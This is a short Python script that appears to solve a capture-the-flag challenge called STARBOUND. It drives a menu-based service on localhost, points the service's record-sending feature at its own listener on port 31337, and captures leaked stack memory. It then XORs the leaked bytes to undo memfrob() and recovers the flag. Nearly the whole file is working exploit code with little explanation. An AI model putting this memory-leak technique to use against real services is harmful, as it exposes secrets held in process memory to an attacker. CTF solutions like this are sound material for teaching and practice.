#!/usr/bin/env python

'''
Stack leakage in sending record function
'''

from util import *
import socket

myip = '127.0.0.1'

s = service()
s.connect('127.0.0.1', 8888)
s.recvuntil('-+STARBOUND v1.0+-')

s.recvuntil('> ')
s.send('6\n')
s.recvuntil('> ')
s.send('3\n')
s.recvuntil('Enter your IP address: ')
s.send(myip + '\n')
s.recvuntil('> ')
s.send('1\n')

# get_info leak flag applied memfrob() on stack
s.recvuntil('> ')
s.send('1\n')

s.recvuntil('> ')
s.send('5\n')
s.recvuntil('Why???? ')
s.send('a\n')
s.recvuntil('Save your record? ')

l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
l.bind(('', 31337))
l.listen(1)
s.send('y\n')
s.close()
lc, addr = l.accept()

buf = ''
while len(buf)<1024:
  x = lc.recv(1024)
  if not x:
    break
  buf += x
lc.close()

print ''.join(map(lambda x: chr(ord(x)^42), buf[752:752+32]))


